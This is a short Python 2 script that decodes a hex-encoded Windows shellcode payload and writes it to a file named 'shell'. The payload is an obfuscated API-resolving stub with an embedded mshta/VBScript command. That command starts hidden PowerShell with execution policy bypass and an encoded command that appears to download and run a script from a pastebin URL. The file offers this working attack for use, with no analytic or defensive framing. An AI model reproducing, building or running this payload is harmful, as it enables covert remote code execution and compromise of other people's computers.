m = "\u18E8\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u6A00\u9000\u9090" + "\ue8fc\u0082\u0000\u8960\u31e5\u64c0\u508b\u8b30\u0c52\u528b\u8b14\u2872\ub70f\u264a\uff31\u3cac\u7c61\u2c02\uc120\u0dcf\uc701\uf2e2\u5752\u528b\u8b10\u3c4a\u4c8b\u7811\u48e3\ud101\u8b51\u2059\ud301\u498b\ue318\u493a\u348b\u018b\u31d6\uacff\ucfc1\u010d\u38c7\u75e0\u03f6\uf87d\u7d3b\u7524\u58e4\u588b\u0124\u66d3\u0c8b\u8b4b\u1c58\ud301\u048b\u018b\u89d0\u2444\u5b24\u615b\u5a59\uff51\u5fe0\u5a5f\u128b\u8deb\u6a5d\u8d01\ub285\u0000\u5000\u3168\u6f8b\uff87\ubbd5\u1de0\u0a2a\ua668\ubd95\uff9d\u3cd5\u7c06\u800a\ue0fb\u0575\u47bb\u7213\u6a6f\u5300\ud5ff\u736d\u7468\u2061\u6276\u6373\u6972\u7470\u633a\u6572\u7461\u6f65\u6a62\u6365\u2874\u7722\u6373\u6972\u7470\u732e\u6568\u6c6c\u2922\u722e\u6e75\u2228\u6f50\u6577\u5372\u6568\u6c6c\u2d20\u6f6e\u2070\u772d\u6e69\u6f64\u7377\u7974\u656c\u6820\u6469\u6564\u206e\u652d\u6578\u2063\u7962\u6170\u7373\u2d20\u6e45\u6f63\u6564\u4364\u6d6f\u616d\u646e\u4420\u4151\u414b\u6b45\u5241\u4251\u4159\u4143\u4b41\u4241\u414f\u5547\u6441\u4177\u4174\u3845\u5941\u4267\u4171\u5547\u5941\u4277\u4130\u4143\u5441\u4267\u416c\u5148\u4c41\u4267\u4158\u5547\u5941\u4267\u4144\u7747\u6141\u4251\u416c\u3447\u6441\u4141\u4170\u3443\u5241\u4241\u4176\u6348\u6241\u4267\u4173\u3847\u5941\u4251\u416b\u4d46\u6441\u4241\u4179\u6b47\u6241\u4267\u416e\u6743\u4a41\u4277\u416f\u5148\u6441\u4241\u4177\u4d48\u4f41\u4167\u4176\u3843\u6341\u4267\u4168\u6348\u4c41\u4267\u416e\u6b47\u6441\u4241\u416f\u4547\u5941\u4277\u4172\u3443\u6541\u4241\u4135\u6f48\u4c41\u4277\u4151\u4d45\u5641\u4277\u4148\u6f46\u5641\u4267\u4150\u4545\u4d41\u4177\u4175\u6f47\u6341\u4241\u416e\u6343\u4b41\u4151\u414e\u6f41\u2241\u302c\u2829\u6977\u646e\u776f\u632e\u6f6c\u6573\u0029"

shell = m.replace('\\u', '').decode('hex')

with open('shell', 'w') as f:
    f.write(shell)


